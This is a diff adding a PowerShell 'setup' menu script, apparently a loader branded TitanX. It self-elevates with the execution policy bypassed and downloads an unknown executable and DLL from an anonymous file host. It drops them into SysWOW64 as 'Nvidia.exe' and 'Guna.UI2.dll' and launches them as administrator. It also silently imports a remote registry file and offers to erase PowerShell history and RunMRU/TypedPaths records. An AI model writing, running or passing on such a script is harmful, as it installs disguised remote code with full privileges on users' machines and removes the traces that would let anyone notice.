@@ -1,0 +1,293 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Clear-Host
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "     Saipoz Setup" -ForegroundColor Magenta
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  [1] Setup one" -ForegroundColor Green
+Write-Host "  [2] Setup two" -ForegroundColor Yellow
+Write-Host "  [3] Clear PowerShell History" -ForegroundColor Red
+Write-Host "  [4] Exit" -ForegroundColor Gray
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+
+$choice = Read-Host "`nEnter your choice (1/2/3/4)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "`n[!] Restarting with Administrator privileges..." -ForegroundColor Yellow
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+# หาโฟลเดอร์ Downloads แบบหลายวิธี
+$downloadsPath = "$env:USERPROFILE\Downloads"
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = [Environment]::GetFolderPath("UserDownloads")
+}
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = [Environment]::GetFolderPath("MyDocuments") + "\Downloads"
+}
+if (-not (Test-Path $downloadsPath)) {
+    $downloadsPath = "C:\Downloads"
+    if (-not (Test-Path $downloadsPath)) {
+        New-Item -ItemType Directory -Path $downloadsPath -Force | Out-Null
+    }
+}
+
+$regDestination = Join-Path $env:TEMP "titanx_reg.reg"
+$regUrl = "https://files.catbox.moe/if7ith.reg"
+
+# -----------------------------
+# กำหนดพาธสำหรับ SysWOW64
+# -----------------------------
+$sysWOW64 = "C:\Windows\SysWOW64"
+$exeDestination = Join-Path $sysWOW64 "Nvidia.exe"
+$dllDestination = Join-Path $sysWOW64 "Guna.UI2.dll"
+$exeUrl = "https://files.catbox.moe/bqx5pb.bin"
+$dllUrl = "https://files.catbox.moe/3scqqb.dll"
+
+# -----------------------------
+# Option 1: Download files to SysWOW64
+# -----------------------------
+if ($choice -eq "1") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [1] INSTALLING FILES TO SysWOW64" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # ตรวจสอบและสร้างโฟลเดอร์ SysWOW64 ถ้าไม่มี
+    if (-not (Test-Path $sysWOW64)) {
+        Write-Host "[!] SysWOW64 folder not found. Creating..." -ForegroundColor Yellow
+        try {
+            New-Item -ItemType Directory -Path $sysWOW64 -Force | Out-Null
+            Write-Host "[✓] Created SysWOW64 folder." -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to create SysWOW64 folder: $_" -ForegroundColor Red
+            Write-Host "`nPress any key to exit..."
+            Read-Host
+            exit
+        }
+    }
+
+    # ดาวน์โหลด Nvidia.exe
+    Write-Host "[+] Downloading Nvidia.exe to SysWOW64..." -ForegroundColor Cyan
+    Write-Host "[+] Target: $exeDestination" -ForegroundColor Gray
+    try {
+        $tempFile = Join-Path $env:TEMP "Nvidia_temp.bin"
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -ErrorAction Stop
+        
+        # ถ้ามีไฟล์เก่า ให้ลบก่อน
+        if (Test-Path $exeDestination) {
+            Remove-Item $exeDestination -Force -ErrorAction SilentlyContinue
+        }
+        
+        Move-Item -Path $tempFile -Destination $exeDestination -Force -ErrorAction Stop
+        Write-Host "[✓] Nvidia.exe downloaded successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Failed to download Nvidia.exe: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
+    }
+
+    # ดาวน์โหลด Guna.UI2.dll
+    Write-Host "[+] Downloading Guna.UI2.dll to SysWOW64..." -ForegroundColor Cyan
+    Write-Host "[+] Target: $dllDestination" -ForegroundColor Gray
+    try {
+        $tempDll = Join-Path $env:TEMP "Guna_temp.dll"
+        Invoke-WebRequest -Uri $dllUrl -OutFile $tempDll -ErrorAction Stop
+        
+        # ถ้ามีไฟล์เก่า ให้ลบก่อน
+        if (Test-Path $dllDestination) {
+            Remove-Item $dllDestination -Force -ErrorAction SilentlyContinue
+        }
+        
+        Move-Item -Path $tempDll -Destination $dllDestination -Force -ErrorAction Stop
+        Write-Host "[✓] Guna.UI2.dll downloaded successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Failed to download Guna.UI2.dll: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
+    }
+
+    # ตรวจสอบไฟล์
+    Write-Host "`n[+] Verifying files..." -ForegroundColor Cyan
+    $allGood = $true
+    
+    if (Test-Path $exeDestination) {
+        Write-Host "[✓] Nvidia.exe exists at: $exeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "[✗] Nvidia.exe not found!" -ForegroundColor Red
+        $allGood = $false
+    }
+    
+    if (Test-Path $dllDestination) {
+        Write-Host "[✓] Guna.UI2.dll exists at: $dllDestination" -ForegroundColor Green
+    } else {
+        Write-Host "[✗] Guna.UI2.dll not found!" -ForegroundColor Red
+        $allGood = $false
+    }
+
+    if ($allGood) {
+        Write-Host "`n[+] Launching Nvidia.exe..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath $exeDestination -Verb RunAs -WindowStyle Normal
+            Write-Host "[✓] Program started successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to start program: $_" -ForegroundColor Red
+        }
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Installation completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 2: Run Registry Script
+# -----------------------------
+elseif ($choice -eq "2") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [2] RUNNING REGISTRY SCRIPT" -ForegroundColor Yellow
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # Download registry file
+    Write-Host "[+] Downloading registry script..." -ForegroundColor Cyan
+    try {
+        Invoke-WebRequest -Uri $regUrl -OutFile $regDestination -ErrorAction Stop
+        Write-Host "[✓] Registry script downloaded successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
+    }
+
+    # Verify file exists
+    if (Test-Path $regDestination) {
+        Write-Host "[✓] File verified: $regDestination" -ForegroundColor Green
+        
+        # Run registry file
+        Write-Host "[+] Applying registry changes..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$regDestination`"" -Wait -ErrorAction Stop
+            Write-Host "[✓] Registry script executed successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to execute registry script: $_" -ForegroundColor Red
+        }
+
+        # Clean up temp file
+        Remove-Item $regDestination -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Cleaned up temporary files." -ForegroundColor Cyan
+    } else {
+        Write-Host "[✗] Registry file not found!" -ForegroundColor Red
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Registry operation completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 3: Clear PowerShell History
+# -----------------------------
+elseif ($choice -eq "3") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [3] CLEARING POWERSHELL HISTORY" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    # Clear current session history
+    Write-Host "[+] Clearing current session history..." -ForegroundColor Cyan
+    Clear-History -Force -ErrorAction SilentlyContinue
+    Write-Host "[✓] Current session history cleared." -ForegroundColor Green
+
+    # Clear persistent history file
+    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $historyPath) {
+        Write-Host "[+] Removing persistent history file..." -ForegroundColor Cyan
+        try {
+            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+            Write-Host "[✓] Persistent history file removed." -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Could not remove history file." -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "[!] No persistent history file found." -ForegroundColor Yellow
+    }
+
+    # Clear recent PowerShell run commands from registry
+    Write-Host "[+] Clearing PowerShell run commands from registry..." -ForegroundColor Cyan
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
+    )
+    
+    foreach ($path in $regPaths) {
+        if (Test-Path $path) {
+            try {
+                Remove-Item -Path "$path\*" -Force -ErrorAction SilentlyContinue
+                Write-Host "[✓] Cleared: $path" -ForegroundColor Green
+            } catch {
+                Write-Host "[!] Could not clear: $path" -ForegroundColor Yellow
+            }
+        }
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] PowerShell history cleared successfully!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 4: Exit
+# -----------------------------
+elseif ($choice -eq "4") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     THANK YOU FOR USING TITANX TOOL" -ForegroundColor Magenta
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nExiting... Goodbye!" -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    exit
+}
+
+# -----------------------------
+# Invalid Choice
+# -----------------------------
+else {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     INVALID CHOICE!" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPlease select 1, 2, 3, or 4 only." -ForegroundColor Yellow
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
